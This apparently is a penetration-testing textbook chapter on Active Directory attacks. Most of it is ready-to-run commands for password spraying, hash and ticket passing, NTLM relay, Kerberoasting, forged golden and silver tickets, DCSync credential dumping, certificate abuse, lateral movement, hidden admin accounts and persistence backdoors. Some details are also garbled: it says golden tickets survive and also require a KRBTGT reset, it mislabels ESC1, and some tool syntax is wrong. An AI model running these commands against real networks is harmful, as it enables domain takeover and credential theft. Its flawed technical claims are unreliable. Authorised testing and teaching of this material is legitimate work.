# Chapter 7: Active Directory and Internal Network Penetration Testing

## Table of Contents
1. [Introduction to Active Directory Penetration Testing](#introduction-to-active-directory-penetration-testing)
2. [Active Directory Fundamentals](#active-directory-fundamentals)
3. [Active Directory Enumeration Techniques](#active-directory-enumeration-techniques)
4. [Credential-Based Attacks](#credential-based-attacks)
5. [Kerberos Attacks](#kerberos-attacks)
6. [Active Directory Certificate Services (ADCS) Attacks](#active-directory-certificate-services-adcs-attacks)
7. [Lateral Movement Techniques](#lateral-movement-techniques)
8. [Privilege Escalation in AD Environments](#privilege-escalation-in-ad-environments)
9. [Persistence Mechanisms in Active Directory](#persistence-mechanisms-in-active-directory)
10. [Domain Dominance and Forest Compromise](#domain-dominance-and-forest-compromise)
11. [Essential AD Penetration Testing Tools](#essential-ad-penetration-testing-tools)
12. [Internal Network Penetration Testing Methodology](#internal-network-penetration-testing-methodology)

---

## Introduction to Active Directory Penetration Testing

Active Directory (AD) is the cornerstone of identity and access management in the vast majority of enterprise Windows environments. Developed by Microsoft, AD provides centralized authentication, authorization, and directory services that enable organizations to manage users, computers, groups, and resources at scale. Its ubiquity makes it both an essential business tool and a prime target for attackers.

Active Directory penetration testing has evolved into a specialized discipline within the broader field of security assessment. Unlike external penetration testing that focuses on perimeter defenses, AD testing simulates what happens when an attacker gains initial access to the internal network—whether through compromised credentials, a successful phishing campaign, or physical access. The goal is to identify misconfigurations, vulnerabilities, and security gaps that could allow an attacker to escalate privileges, move laterally, and ultimately compromise the entire domain or forest.

The stakes in AD security are extraordinarily high. A full domain compromise typically grants an attacker:
- Access to all domain-joined systems and resources
- Ability to impersonate any user in the domain
- Persistence mechanisms that survive password changes
- Potential access to other domains in the forest through trust relationships
- Access to sensitive data, intellectual property, and potentially critical infrastructure

This chapter provides a comprehensive exploration of Active Directory attack techniques, from initial enumeration to full domain compromise. The methodologies and tools covered are essential for any penetration tester working in enterprise environments.

---

## Active Directory Fundamentals

### Active Directory Architecture

**Domains and Domain Controllers**

A domain is the basic administrative unit in Active Directory. It represents a boundary of administrative authority and replication, containing:
- User accounts and computer accounts
- Security groups and distribution groups
- Group Policy Objects (GPOs)
- Trust relationships with other domains

Domain Controllers (DCs) are Windows Servers running the Active Directory Domain Services (AD DS) role. They store the directory database (ntds.dit) and handle authentication requests. Multiple DCs provide redundancy and load distribution, replicating changes through multi-master replication.

**Forests and Trees**

A forest is the top-level container in Active Directory, representing the ultimate security boundary. It contains:
- One or more domain trees
- A common schema (object definitions)
- A global catalog
- Enterprise-wide administrators

A tree is a hierarchy of domains sharing a contiguous namespace (e.g., corp.example.com, us.corp.example.com, emea.corp.example.com).

**Organizational Units (OUs)**

OUs are containers within domains used to organize objects and apply Group Policy. Unlike domains and forests, OUs are not security boundaries—administrators of an OU can potentially escalate to domain admin if misconfigured.

**Trust Relationships**

Trusts enable authentication across domain boundaries:
- **Parent-Child Trust**: Automatic, two-way transitive trust between parent and child domains
- **Tree-Root Trust**: Automatic, two-way transitive trust between domain trees
- **External Trust**: Manual trust between domains in different forests (non-transitive)
- **Forest Trust**: Transitive trust between root domains of different forests
- **Shortcut Trust**: Manual trust to optimize authentication paths

### Active Directory Objects and Attributes

**User Accounts**
User objects represent individuals or service accounts. Key attributes include:
- sAMAccountName: Legacy logon name (DOMAIN\username)
- userPrincipalName (UPN): Modern logon format (user@domain.com)
- userAccountControl: Bitmask of account flags (enabled, password never expires, etc.)
- memberOf: Group memberships
- servicePrincipalName (SPN): For Kerberos service authentication

**Computer Accounts**
Computer objects represent domain-joined systems. They have passwords that rotate every 30 days by default and can be used for authentication like user accounts.

**Groups**
Groups simplify permission management:
- **Security Groups**: Assign permissions to resources
- **Distribution Groups**: Email distribution only
- **Group Scopes**: Domain Local, Global, Universal

Important built-in groups include Domain Admins, Enterprise Admins, Schema Admins, Account Operators, and Backup Operators.

**Access Control Lists (ACLs)**

Every AD object has a Security Descriptor containing:
- **DACL (Discretionary ACL)**: Defines who can access the object and how
- **SACL (System ACL)**: Defines what access attempts to audit

ACLs consist of Access Control Entries (ACEs) that specify:
- Security Identifier (SID) of the trustee
- Access mask (permissions granted)
- ACE flags (inheritance, etc.)

### Authentication Protocols

**NT LAN Manager (NTLM)**

NTLM is a challenge-response authentication protocol:
1. Client sends username to server
2. Server responds with random 8-byte nonce (challenge)
3. Client encrypts challenge with NT hash (MD4 of Unicode password)
4. Server verifies by performing same calculation

NTLMv2 improves security with additional variables including timestamp and target information.

**Kerberos**

Kerberos is the default authentication protocol in modern Windows domains:
1. **AS-REQ/AS-REP**: User requests Ticket Granting Ticket (TGT) from Key Distribution Center (KDC) on Domain Controller
2. **TGS-REQ/TGS-REP**: User presents TGT to request service ticket for specific resource
3. **AP-REQ**: User presents service ticket to access the service

Kerberos tickets contain encrypted data including session keys and authorization data (PAC - Privilege Attribute Certificate).

### Group Policy Overview

Group Policy Objects (GPOs) define security settings, software installation, and configurations applied to users and computers. They can be:
- **Linked to domains**: Affect all objects in the domain
- **Linked to OUs**: Affect objects within the OU
- **Enforced**: Cannot be overridden by lower-level policies
- **Filtered**: Apply only to specific security groups

GPOs are stored in two locations:
- **AD Database**: GPC (Group Policy Container) contains metadata
- **SYSVOL**: GPT (Group Policy Template) contains actual settings and scripts

---

## Active Directory Enumeration Techniques

Effective AD penetration testing begins with comprehensive enumeration. The more information gathered, the more precise and successful subsequent attacks will be.

### Network-Level Enumeration

**DNS Enumeration**

DNS often reveals significant AD infrastructure information:

```bash
# DNS zone transfer attempt
dig axfr @<dns_server> <domain>

# Enumerate DNS records
dnsenum <domain>
dnsrecon -d <domain> -t axfr
dnsrecon -d <domain> -t std --xml output.xml

# NSLookup queries
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>
nslookup -type=SRV _kerberos._tcp.dc._msdcs.<domain>
nslookup -type=SRV _gc._tcp.<domain>
nslookup -type=A <domain>
```

Service Location (SRV) records reveal critical infrastructure:
- `_ldap._tcp.dc._msdcs`: Domain Controllers
- `_kerberos._tcp.dc._msdcs`: Kerberos servers
- `_gc._tcp`: Global Catalog servers

**SMB Enumeration**

```bash
# Null session enumeration (legacy systems)
smbclient -L //<target> -N
rpcclient -U "" -N <target>

# Enumerate shares
smbmap -H <target>
smbmap -H <target> -u <user> -p <password>

# Enumerate with enum4linux
enum4linux -a <target>
enum4linux -u <user> -p <password> -a <target>

# CrackMapExec for quick enumeration
crackmapexec smb <target_range>
crackmapexec smb <target> --shares
crackmapexec smb <target> --users
crackmapexec smb <target> --groups
crackmapexec smb <target> --pass-pol
```

**LDAP Enumeration**

```bash
# ldapsearch queries
ldapsearch -x -H ldap://<dc_ip> -D "<user>@<domain>" -w <password> -b "dc=<domain>,dc=<tld>"

# Anonymous bind (if enabled)
ldapsearch -x -H ldap://<dc_ip> -b "dc=<domain>,dc=<tld>" "(objectClass=user)"

# Find domain controllers
ldapsearch -x -H ldap://<dc_ip> -b "ou=Domain Controllers,dc=<domain>,dc=<tld>"

# Enumerate users
ldapsearch -x -H ldap://<dc_ip> -D "<bind_dn>" -w <password> -b "dc=<domain>,dc=<tld>" "(objectClass=user)" sAMAccountName

# Nmap LDAP scripts
nmap -p 389,636 --script ldap-rootdse,ldap-search,ldap-brute <target>
```

### Authenticated Enumeration with Built-in Tools

Once valid credentials are obtained, built-in Windows tools enable extensive enumeration:

```powershell
# PowerView comprehensive enumeration
Import-Module PowerView.ps1

# Domain information
Get-Domain
Get-DomainController
Get-DomainPolicy

# User enumeration
Get-DomainUser | Select-Object samaccountname, userprincipalname, memberof
Get-DomainUser -Properties samaccountname, userprincipalname, description | Format-Table

# Find users with SPNs (Kerberoast targets)
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Find users with password not required
Get-DomainUser -PasswordNotRequired

# Find users with password never expires
Get-DomainUser -PasswordNeverExpires

# Group enumeration
Get-DomainGroup | Select-Object samaccountname, memberof
Get-DomainGroup -AdminCount | Select-Object samaccountname, member

# Find interesting groups
Get-DomainGroup "Domain Admins" | Select-Object -ExpandProperty member
Get-DomainGroup "Enterprise Admins" | Select-Object -ExpandProperty member

# Computer enumeration
Get-DomainComputer | Select-Object samaccountname, operatingsystem, dnshostname
Get-DomainComputer -Unconstrained | Select-Object samaccountname
Get-DomainComputer -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto

# Trust enumeration
Get-DomainTrust
Get-DomainTrust -API
Get-ForestTrust

# GPO enumeration
Get-DomainGPO | Select-Object displayname, gpcfilesyspath
Get-DomainGPO -ComputerName <computer>

# ACL enumeration
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
Get-DomainUser <user> | Get-ObjectAcl -ResolveGUIDs

# Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs

# Domain shares
Find-DomainShare
Find-DomainShare -CheckShareAccess

# Sensitive files
Find-InterestingDomainShareFile -Path "\\<server>\share"
```

### BloodHound Enumeration

BloodHound revolutionized AD enumeration by mapping attack paths graphically:

```powershell
# SharpHound data collection
Import-Module SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain <domain> -ZipFileName output.zip

# Specific collection methods
Invoke-BloodHound -CollectionMethod Default  # Groups, Trusts, Sessions, ACLs, ObjectProps
Invoke-BloodHound -CollectionMethod Session  # Active sessions only
Invoke-BloodHound -CollectionMethod LoggedOn  # Logged-on users (requires admin)
Invoke-BloodHound -CollectionMethod ACL  # Access control lists
Invoke-BloodHound -CollectionMethod GPOLocalGroup  # GPO-to-group memberships

# Stealth options
Invoke-BloodHound -CollectionMethod All -Stealth
Invoke-BloodHound -CollectionMethod All -ExcludeDC

# Python-based BloodHound ingestion (Linux)
bloodhound-python -u <user> -p <password> -ns <dns_server> -d <domain> -c All
```

BloodHound data is analyzed in the neo4j-based GUI, revealing:
- Shortest paths to Domain Admin
- Kerberoastable accounts
- AS-REP Roastable accounts
- Unconstrained delegation
- Users with sensitive privileges

### LDAP Filter-Based Enumeration

Targeted LDAP queries reveal specific attack opportunities:

```powershell
# Users with SPN (Kerberoasting targets)
([adsisearcher]"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))").FindAll()

# Users not requiring Kerberos pre-authentication (AS-REP Roasting)
([adsisearcher]"(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))").FindAll()

# Trusted for unconstrained delegation
([adsisearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))").FindAll()

# Trusted for constrained delegation
([adsisearcher]"(&(objectCategory=computer)(msds-allowedtodelegateto=*))").FindAll()

# Users with password never expires
([adsisearcher]"(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))").FindAll()

# Find interesting descriptions (password hints)
([adsisearcher]"(&(objectCategory=person)(objectClass=user)(description=*pass*))").FindAll()
```

### Network Service Enumeration

```bash
# Comprehensive port scanning
nmap -sC -sV -p- -oA full_scan <target_range>

# Find management interfaces
nmap -p 5985,5986,47001,80,443,8080,8443 --open <target_range>

# Find database servers
nmap -p 1433,3306,5432,27017,6379,1521 --open <target_range>

# Find Windows-specific services
nmap -p 135,139,445,3389,5985,5986,9389 --open <target_range>
```

---

## Credential-Based Attacks

### Password Attacks

**Password Spraying**

Password spraying avoids account lockouts by trying common passwords against many accounts:

```bash
# CrackMapExec password spray
crackmapexec smb <dc_ip> -u users.txt -p passwords.txt --continue-on-success
crackmapexec smb <dc_ip> -u users.txt -p 'Password123!' --local-auth

# Kerbrute for password spray (no logging on DC)
./kerbrute passwordspray -d <domain> users.txt "Password123!"

# PowerShell password spray
Import-Module DomainPasswordSpray
Invoke-DomainPasswordSpray -UserList users.txt -Password "Password123!"

# Custom spray with delay
Invoke-DomainPasswordSpray -UserList users.txt -PasswordList passwords.txt -Delay 10 -Jitter 20
```

**Credential Validation**

```bash
# Verify credentials without triggering alerts
crackmapexec smb <dc_ip> -u <user> -p <password>
crackmapexec winrm <dc_ip> -u <user> -p <password>
crackmapexec ldap <dc_ip> -u <user> -p <password>

# Test across multiple protocols
crackmapexec smb <target_range> -u <user> -p <password> --continue-on-success
crackmapexec mssql <target_range> -u <user> -p <password>
crackmapexec ssh <target_range> -u <user> -p <password>
```

### Pass-the-Hash (PtH)

Pass-the-Hash uses NTLM hashes directly without cracking passwords:

```bash
# Mimikatz Pass-the-Hash
privilege::debug
sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm_hash> /run:cmd.exe

# Pass-the-Hash with CrackMapExec
crackmapexec smb <target> -u <user> -H <ntlm_hash>
crackmapexec smb <target> -u <user> -H <ntlm_hash> -x "whoami"
crackmapexec smb <target_range> -u <user> -H <ntlm_hash> --local-auth

# Impacket tools with PtH
psexec.py -hashes <lm_hash>:<ntlm_hash> <domain>/<user>@<target>
wmiexec.py -hashes <lm_hash>:<ntlm_hash> <domain>/<user>@<target>
atexec.py -hashes <lm_hash>:<ntlm_hash> <domain>/<user>@<target>

# Evil-WinRM with hash
evil-winrm -i <target> -u <user> -H <ntlm_hash>

# PsExec with Mimikatz generated token
# (Use token::elevate then sekurlsa::pth)
```

### Pass-the-Ticket (PtT)

Kerberos tickets can be passed similarly to hashes:

```bash
# Mimikatz Pass-the-Ticket
privilege::debug
kerberos::ptt <ticket.kirbi>

# Convert ccache to kirbi
ticket_converter.py ticket.ccache ticket.kirbi

# Rubeus Pass-the-Ticket
Rubeus.exe ptt /ticket:<base64_ticket>
Rubeus.exe ptt /ticket:<ticket.kirbi>

# Use with Impacket
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass <domain>/<user>@<target>
smbexec.py -k -no-pass <domain>/<user>@<target>
```

### Overpass-the-Hash

Overpass-the-Hash converts NTLM hash to Kerberos ticket:

```bash
# Mimikatz overpass
crypto::rc4 /ntlm:<ntlm_hash> /user:<user> /domain:<domain> /ptt

# Rubeus overpass
Rubeus.exe asktgt /user:<user> /rc4:<ntlm_hash> /ptt
Rubeus.exe asktgt /user:<user> /aes256:<aes_key> /ptt
```

### NTLM Relay Attacks

NTLM relay captures and forwards authentication attempts:

```bash
# Responder for capturing hashes
sudo responder -I eth0 -wrfv

# NTLM relay with ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
ntlmrelayx.py -tf targets.txt -smb2support -i -socks

# Targeted relay to specific host
ntlmrelayx.py -t <target> -smb2support -c "net user <user> <password> /add"

# Relay to LDAP for RBCD attack
ntlmrelayx.py -t ldaps://<dc> --delegate-access -smb2support

# Multi-relay with SOCKS
ntlmrelayx.py -tf targets.txt -smb2support -socks -i
```

Mitigation bypasses:
```bash
# Force downgrade to NTLMv2 only (if NTLMv1 allowed)
# Target systems with SMB signing disabled
crackmapexec smb <target_range> --gen-relay-list targets.txt
```

### Cached Credential Extraction

**Local SAM and SECURITY Hives**

```bash
# Extract from local registry
reg.exe save HKLM\SAM sam.save
reg.exe save HKLM\SECURITY security.save
reg.exe save HKLM\SYSTEM system.save

# Parse with secretsdump
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

**LSA Secrets**

```bash
# Mimikatz LSA secrets
privilege::debug
lsadump::secrets

# Impacket alternatives
secretsdump.py <domain>/<user>:<password>@<target>
```

**Credential Manager**

```bash
# Mimikatz Credential Manager
privilege::debug
dpapi::cred /in:%localappdata%\Microsoft\Credentials\<cred_file>
```

---

## Kerberos Attacks

### Kerberoasting

Kerberoasting extracts service account credentials from Service Principal Names (SPNs):

```bash
# Request tickets for all SPNs with Rubeus
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
Rubeus.exe kerberoast /stats

# PowerView/Invoke-Kerberoast
Import-Module PowerView.ps1
Invoke-Kerberoast -OutputFormat hashcat | Select-Object -ExpandProperty hash | Out-File hashes.txt

# Linux with Impacket
GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password> -outputfile hashes.txt

# Target specific user
GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password> -request-user <target_user>

# Crack with Hashcat
hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule
```

**AS-REP Roasting**

AS-REP Roasting targets users with "Do not require Kerberos preauthentication" enabled:

```bash
# Find AS-REP roastable users
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# PowerView
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname

# Impacket
GetNPUsers.py -dc-ip <dc_ip> <domain>/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
GetNPUsers.py -dc-ip <dc_ip> <domain>/<user>:<password> -request -format hashcat

# Crack AS-REP hashes
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

### Golden Ticket

Golden Tickets are forged TGTs signed with the KRBTGT account hash:

```bash
# Extract KRBTGT hash
# Mimikatz on DC:
lsadump::lsa /inject /name:krbtgt

# Or from backup:
lsadump::dcsync /domain:<domain> /user:krbtgt

# Forge Golden Ticket
kerberos::golden /user:<any_username> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_ntlm> /id:500 /groups:512 /ptt

# Golden Ticket with extra options
kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-... /krbtgt:hash /id:500 /groups:512,513,518,519,520 /sids:S-1-5-21-...-519 /startoffset:-10 /endin:600 /renewmax:10080 /ptt

# DCSync simulation with Golden Ticket
lsadump::dcsync /dc:<dc> /domain:<domain> /user:<target_user>
```

Golden Ticket persistence considerations:
- Valid until ticket lifetime expires (typically 10 years with Mimikatz)
- Survives password changes for KRBTGT
- Requires KRBTGT password change (twice) to invalidate

### Silver Ticket

Silver Tickets are forged service tickets for specific services:

```bash
# Forge Silver Ticket for CIFS
kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /target:<target_server> /rc4:<service_account_ntlm> /service:cifs /ptt

# Silver Ticket for LDAP
kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-... /target:dc.corp.com /rc4:service_hash /service:LDAP /ptt

# Silver Ticket for WMI
kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-... /target:target.corp.com /rc4:service_hash /service:HOST /ptt
kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-... /target:target.corp.com /rc4:service_hash /service:RPCSS /ptt
```

### Skeleton Key

Skeleton Key patches LSASS memory to accept a master password:

```bash
# Mimikatz Skeleton Key (requires Domain Admin)
privilege::debug
misc::skeleton

# Now authenticate with any user and password "mimikatz"
net use \\<dc>\ipc$ /user:corp.com\Administrator mimikatz
```

### DCSync Attack

DCSync simulates Domain Controller replication to extract credentials:

```bash
# Mimikatz DCSync
lsadump::dcsync /domain:<domain> /user:<target_user>
lsadump::dcsync /domain:<domain> /user:krbtgt
lsadump::dcsync /domain:<domain> /all

# Impacket secretsdump
secretsdump.py <domain>/<user>:<password>@<dc>
secretsdump.py -just-dc <domain>/<user>:<password>@<dc>
secretsdump.py -just-dc-ntlm <domain>/<user>:<password>@<dc>
secretsdump.py -just-dc-user <username> <domain>/<user>:<password>@<dc>

# Extract specific users
secretsdump.py -just-dc-user krbtgt -just-dc-user Administrator <domain>/<user>:<password>@<dc>
```

DCSync requirements:
- Replicating Directory Changes permission
- Replicating Directory Changes All permission (for secrets)
- Domain Admins, Enterprise Admins, or custom delegated permissions

---

## Active Directory Certificate Services (ADCS) Attacks

### ADCS Enumeration

```bash
# Certify enumeration
Certify.exe cas
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser

# PowerShell enumeration
Get-ChildItem -Path Cert:\LocalMachine\CA
Get-ChildItem -Path Cert:\CurrentUser\My

# Find certificate templates
certutil -template
```

### ESC1 - Web Enrollment Misconfiguration

```bash
# Request certificate with alternate name
certipy req -u <user>@<domain> -p <password> -target <ca> -ca <ca_name> -template <template> -upn administrator@<domain>

# Authenticate with certificate
certipy auth -pfx administrator.pfx
```

### ESC8 - NTLM Relay to ADCS HTTP Enrollment

```bash
# Identify vulnerable enrollment endpoints
certipy find -u <user>@<domain> -p <password> -target <ca>

# NTLM relay to ADCS
ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template <template>

# Use requested certificate
certipy auth -pfx <certificate.pfx>
```

### Certificate Theft and Forgery

```bash
# Export certificates with Mimikatz
crypto::certificates /export

# Forge certificate with stolen CA
certipy forge -ca-pfx <ca.pfx> -upn <user>@<domain>
```

---

## Lateral Movement Techniques

### PsExec

```bash
# Sysinternals PsExec
psexec.exe \\<target> -u <domain>\<user> -p <password> cmd.exe
psexec.exe \\<target> -s cmd.exe  # SYSTEM context

# Metasploit
use exploit/windows/smb/psexec

# Impacket psexec
psexec.py <domain>/<user>:<password>@<target>
psexec.py -hashes <lm>:<ntlm> <domain>/<user>@<target>

# Remotely enable and start service
sc.exe \\<target> create <servicename> binPath= "cmd.exe /c <command>"
sc.exe \\<target> start <servicename>
```

### WMI and WinRM

```bash
# WMI lateral movement
wmic /node:<target> /user:<domain>\<user> /password:<password> process call create "cmd.exe /c <command>"

# Impacket wmiexec (stealthier)
wmiexec.py <domain>/<user>:<password>@<target>
wmiexec.py -hashes <lm>:<ntlm> <domain>/<user>@<target>

# WinRM with Evil-WinRM
evil-winrm -i <target> -u <user> -p <password>
evil-winrm -i <target> -u <user> -H <ntlm_hash>

# Enable WinRM remotely
wmic /node:<target> process call create "powershell.exe -Command Enable-PSRemoting -Force"
```

### Scheduled Tasks

```bash
# Create remote scheduled task
schtasks /create /S <target> /U <domain>\<user> /P <password> /TN "TaskName" /TR "cmd.exe /c <command>" /SC once /ST 12:00
schtasks /run /S <target> /U <domain>\<user> /P <password> /TN "TaskName"
schtasks /delete /S <target> /U <domain>\<user> /P <password> /TN "TaskName" /F

# PowerShell Remoting
Invoke-Command -ComputerName <target> -Credential <cred> -ScriptBlock { <commands> }
```

### Remote Desktop

```bash
# Enable RDP
reg add "\\<target>\HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
sc.exe \\<target> start termservice

# Remote desktop connection
xfreerdp3 /u:<user> /d:<domain> /p:<password> /v:<target>
xrdp /u:<user> /d:<domain> /pth:<ntlm_hash> /v:<target>

# Enable restricted admin mode (Pass-the-Hash)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
xfreerdp3 /u:<user> /pth:<ntlm_hash> /v:<target>
```

### SSH and PowerShell Remoting

```bash
# PowerShell remoting
Enter-PSSession -ComputerName <target> -Credential <cred>
Invoke-Command -ComputerName <target> -Credential <cred> -FilePath <script.ps1>

# SSH on Windows (if OpenSSH installed)
ssh <domain>\\<user>@<target>
```

### Distributed Component Object Model (DCOM)

```powershell
# DCOM lateral movement
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1", "<target>"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c <command>", "7")
```

---

## Privilege Escalation in AD Environments

### Enumeration for Privilege Escalation

```powershell
# PowerUp comprehensive check
Import-Module PowerUp.ps1
Invoke-AllChecks

# Find potentially vulnerable services
Get-Service | Where-Object {$_.StartType -eq "Auto" -and $_.Status -ne "Running"}

# Check for unquoted service paths
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v '"'

# Check service permissions
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *

# Check for modifiable registry keys
accesschk.exe /accepteula -uvwqk "HKLM\System\CurrentControlSet\Services"

# AlwaysInstallElevated registry check
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Token Impersonation

```bash
# Mimikatz token manipulation
token::whoami
token::list
token::elevate
token::elevate /domainadmin
token::run /process:cmd.exe /user:<domain>\<user>

# Incognito
list_tokens -u
impersonate_token <domain>\\<user>
```

### Named Pipe Impersonation

```bash
# PrintSpoofer
PrintSpoofer.exe -c "cmd.exe"
PrintSpoofer.exe -i -c "cmd.exe"

# RoguePotato
RoguePotato.exe -r <rogue_server> -e "cmd.exe"

# PetitPotam (forced authentication)
PetitPotam.exe <listener_ip> <target_ip>
```

### Resource-Based Constrained Delegation (RBCD)

```bash
# Check for RBCD abuse potential
# Requires control over a computer account or user with SPN

# Add RBCD using ntlmrelayx
ntlmrelayx.py -t ldaps://<dc> --delegate-access -smb2support

# Exploit with Impacket
rbcd.py -delegate-from <controlled_computer> -delegate-to <target_computer> <domain>/<user>:<password>
getST.py -spn cifs/<target_computer> -impersonate Administrator <domain>/<controlled_computer> -k
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <domain>/Administrator@<target_computer>
```

### Group Policy Preference (GPP) Passwords

Legacy GPP could store encrypted passwords in SYSVOL:

```bash
# Find GPP XML files
findstr /S /I cpassword \\<domain>\sysvol\<domain>\policies\*.xml

# Decrypt with Metasploit
use post/windows/gather/credentials/gpp

# Decrypt with gpp-decrypt
gpp-decrypt <encrypted_password>
```

---

## Persistence Mechanisms in Active Directory

### Account-Based Persistence

**Golden Ticket (already covered)**

**Silver Ticket (already covered)**

**Skeleton Key (already covered)**

**Account Manipulation**

```bash
# Add user to privileged group
net group "Domain Admins" <user> /add /domain

# Create hidden user (ending with $)
net user <user>$ <password> /add /domain
net group "Domain Admins" <user>$ /add /domain

# Modify SDProp excluded groups
# Add user to AdminSDHolder-protected groups
```

### DCShadow

DCShadow registers a rogue Domain Controller to inject malicious changes:

```bash
# Mimikatz DCShadow
lsadump::dcshadow /object:<target_object> /attribute:member /value:<sid_to_add>

# Full DCShadow attack
# Requires Domain Admin or enough rights to modify AD configuration
lsadump::dcshadow /push
```

### AdminSDHolder Abuse

AdminSDHolder protects privileged accounts by resetting permissions every 60 minutes:

```bash
# Modify AdminSDHolder ACL
# Add attacker-controlled principal to AdminSDHolder permissions
# Wait 60 minutes for SDProp to propagate
```

### DCSync Persistence

Grant DCSync rights to maintain credential access:

```bash
# Add DS-Replication-Get-Changes to user
# Using PowerView
Add-ObjectAcl -TargetIdentity "DC=<domain>,DC=<tld>" -PrincipalIdentity <user> -Rights DCSync

# Verify rights
Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.IdentityReference -like "*<user>*"}
```

### GPO-Based Persistence

```bash
# Create malicious GPO
# Link to target OU
# Configure:
# - Immediate scheduled task
# - Registry run keys
# - Startup/logon scripts
# - Service installation

# Force GPO update
gpupdate /force /target:computer
```

### ACL Backdoors

```bash
# Add hidden ACE to sensitive objects
# GenericAll on Domain object
# DCSync rights
# Self-membership in privileged groups

# Using PowerView
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity <user> -Rights All
```

---

## Domain Dominance and Forest Compromise

### Cross-Domain Attacks

**Trust Ticket Attacks**

```bash
# Enumerate trusts
Get-DomainTrust
Get-ForestTrust

# Forge inter-realm TGT
# Requires SID of target domain and trust key
kerberos::golden /user:Administrator /domain:<source_domain> /sid:<source_sid> /sids:<target_domain_sid>-519 /krbtgt:<trust_key> /service:krbtgt /target:<target_domain> /ticket:trust_ticket.kirbi

# Use trust ticket to get TGS in target domain
asktgs.exe trust_ticket.kirbi CIFS/<target_dc>
```

**ExtraSID Attack (Inter-Forest)**

```bash
# Exploit SID History across forest trusts
# Requires Enterprise Admin in source forest
# Add SID of target forest Enterprise Admins to user's SID History
```

### Forest Compromise

Complete forest compromise requires:
1. Enterprise Admin access in any domain
2. KRBTGT hash compromise in root domain
3. Schema Admin access for permanent modifications

```bash
# DCSync across domains
secretsdump.py <domain>/<user>:<password>@<root_dc>

# Forge Enterprise Admin Golden Ticket
kerberos::golden /user:Administrator /domain:<root_domain> /sid:<root_sid> /krbtgt:<root_krbtgt_hash> /groups:512,518,519,520 /ptt
```

---

## Essential AD Penetration Testing Tools

### CrackMapExec

The swiss army knife for AD pentesting:

```bash
# Installation
pip install crackmapexec

# SMB enumeration
crackmapexec smb <target_range>
crackmapexec smb <target_range> -u <user> -p <password>
crackmapexec smb <target_range> -u <user> -H <hash>

# Execute commands
crackmapexec smb <target> -u <user> -p <password> -x "whoami"
crackmapexec smb <target> -u <user> -p <password> -X "Get-Process"

# Dump SAM/LSA
crackmapexec smb <target> -u <user> -p <password> --sam
crackmapexec smb <target> -u <user> -p <password> --lsa
crackmapexec smb <target> -u <user> -p <password> --ntds

# Pass-the-Hash
crackmapexec smb <target_range> -u <user> -H <lm>:<ntlm> --local-auth

# Module execution
crackmapexec smb <target> -u <user> -p <password> -M mimikatz
crackmapexec smb <target> -u <user> -p <password> -M lsassy
crackmapexec smb <target> -u <user> -p <password> -M spider_plus -o READ_ONLY=false

# Protocol support
crackmapexec winrm <target_range> -u <user> -p <password>
crackmapexec ldap <target_range> -u <user> -p <password>
crackmapexec mssql <target_range> -u <user> -p <password>
crackmapexec ssh <target_range> -u <user> -p <password>
```

### Impacket

Comprehensive Python networking suite:

```bash
# Remote execution
psexec.py <domain>/<user>:<password>@<target>
smbexec.py <domain>/<user>:<password>@<target>
wmiexec.py <domain>/<user>:<password>@<target>
atexec.py <domain>/<user>:<password>@<target>

# Credential extraction
secretsdump.py <domain>/<user>:<password>@<target>

# Kerberos attacks
GetUserSPNs.py -request <domain>/<user>:<password>
GetNPUsers.py <domain>/<user>:<password> -request

# Relay attacks
ntlmrelayx.py -tf targets.txt

# LDAP enumeration
ldapdomaindump.py <domain>/<user>:<password>@<dc>
```

### Mimikatz

Credential extraction and manipulation:

```bash
# Credential extraction
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export
lsadump::sam
lsadump::secrets
lsadump::dcsync /user:<domain>\<target>

# Token manipulation
token::whoami
token::elevate
token::run /user:<domain>\<user> cmd.exe

